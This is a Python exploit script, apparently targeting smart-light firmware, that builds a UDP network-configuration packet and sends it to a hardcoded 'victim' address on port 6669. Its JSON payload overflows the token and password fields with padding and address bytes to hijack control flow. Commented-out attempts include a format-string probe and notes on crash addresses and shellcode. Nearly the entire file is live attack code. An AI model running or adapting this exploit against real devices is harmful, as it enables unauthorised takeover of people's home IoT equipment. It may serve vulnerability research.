import struct
import zlib
import socket 

MAX_CONFIG_PACKET_PAYLOAD_LEN = 0xE8

VICTIM_IP = '192.168.175.1'
VICTIM_PORT = 6669

def build_network_config_packet(payload):
    if len(payload) > MAX_CONFIG_PACKET_PAYLOAD_LEN:
        raise ValueError('Payload is too long!')
    # NOTE
    # fr_num and crc do not seem to be used in the disas
    # calculating them anyway - in case it's needed
    # for some reason.
    tail_len = 8
    head, tail = 0x55aa, 0xaa55
    fr_num, fr_type = 0, 0x1
    plen = len(payload) + tail_len
    buffer = struct.pack("!IIII", head, fr_num, fr_type, plen)
    buffer += payload
    crc = zlib.crc32(buffer)
    buffer += struct.pack("!II", crc, tail)
    return buffer

def send_network_config_datagram(datagram):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto(datagram, (VICTIM_IP, VICTIM_PORT))

def encode_json_val(value):
    encoded = []
    escaped = list(map(ord, '"\\'))
    escape_char = ord('\\')
    for i in value:
        if i in escaped:
            encoded.append(escape_char)
        encoded.append(i)
    return bytes(encoded)

def check_valid_payload(value):
    eq_zero = lambda x: x == 0
    if any(map(eq_zero, value)):
        print('[!] At least one null byte detected in payload. Clobbering will stop before that.')
    return value


# TODO: Get original R3 (finish_cb) value = 0x00097D47 - in ARM THUMB mode
# 0x00097D34 can be used to leak info since it crashes at the callsite?
# 0x43, 0x45, 0x47 or 0x49!
# 0x5b also works?!
# 0x5b, 0x5d, 0x5f, 0x63, 0x65, 0x69, 0x6b also work
# 0x6d, 0x6f, 0x71 causes an error with SysMalloc failed size: 0x4228c0 (r0?)
# what if we do some shellcoding in r0?
# \x71\x2D\x42
# 422d70
# 0041F490
# 000a0ecc
# addr_overwrite_val = b'\xcd\x0e\x0a'
# padding = b'A' * 72
# token = encode_json_val(padding + addr_overwrite_val)
# 
# ssid = encode_json_val(b'%p%n')
# password = encode_json_val(b'PASSWD_HAX_STUFF')
# 
# payload = b'{"ssid":"' + ssid
# payload += b'","passwd":"' + password
# payload += b'","token":"' + token
# payload += b'"}'

# MOOD LIGHT
#payload = b'{"auzkey":"AAAAAAAAAAAAAAAA","uuid":"abcd","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"A","token":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x57\x11\x03","passwd":"AAAAAAAAAAAAAAAAAAAA\xa1\x74\x0d"}'

# E27 WHITE LIGHT PAYLOAD
payload = b'{"auzkey":"AAAAAAAAAAAAAAAA","uuid":"abcd","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"A","token":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb9\x94\x0b","passwd":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x15\xd5\x0a"}'

payload = check_valid_payload(payload)

datagram = build_network_config_packet(payload=payload)
send_network_config_datagram(datagram=datagram)